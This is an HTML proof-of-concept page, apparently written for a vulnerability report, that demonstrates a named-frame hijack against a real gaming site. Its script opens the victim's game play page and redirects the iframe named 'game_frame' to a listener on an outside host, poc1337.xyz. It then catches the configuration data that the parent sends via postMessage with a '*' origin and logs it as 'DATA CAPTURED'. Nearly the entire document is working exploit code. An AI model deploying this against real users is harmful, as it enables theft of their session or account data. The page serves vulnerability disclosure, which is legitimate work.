<!DOCTYPE html>
<html>

<head>
    <title>PoC</title>
</head>

<body>
    <h3>Nutaku Named Frame Hijack PoC</h3>
    <button id="start">Start PoC</button>
    <pre id="log"></pre>

    <script>
        var log = document.getElementById('log');

        function addLog(msg) {
            log.textContent += '[' + new Date().toISOString().substr(11, 8) + '] ' + msg + '\n';
        }

        document.getElementById('start').onclick = function() {
            // Step 1: Open the Nutaku GI play page — establishes browsing context group
            addLog('Opening Nutaku play page...');
            var victimTab = window.open('https://xnxx.nutaku.net/games/lust-goddess/play/');

            // Step 2: Wait for DOMReady on the play page (JS sets up iframeCall),
            // but BEFORE window.load (which sends the config postMessage).
            // GI games load huge Unity WebGL assets, so window.load takes seconds.
            setTimeout(function() {
                addLog('Hijacking game_frame iframe...');

                // Step 3: Navigate the named iframe to our listener.
                // The browser finds "game_frame" in the Nutaku tab (same browsing context group)
                // and loads our page there. The parent's n.contentWindow now points to us.
                window.open('https://poc1337.xyz/listener.html', 'game_frame');

                addLog('Iframe hijacked. Waiting for parent to send config via postMessage("*")...');
            }, 3000);
        };

        // Step 5: Receive captured data relayed from the listener
        window.addEventListener('message', function(e) {
            if (e.data && e.data.stolen) {
                addLog('DATA CAPTURED:');
                addLog(JSON.stringify(e.data.stolen, null, 2));
            }
        });
    </script>
</body>

</html>
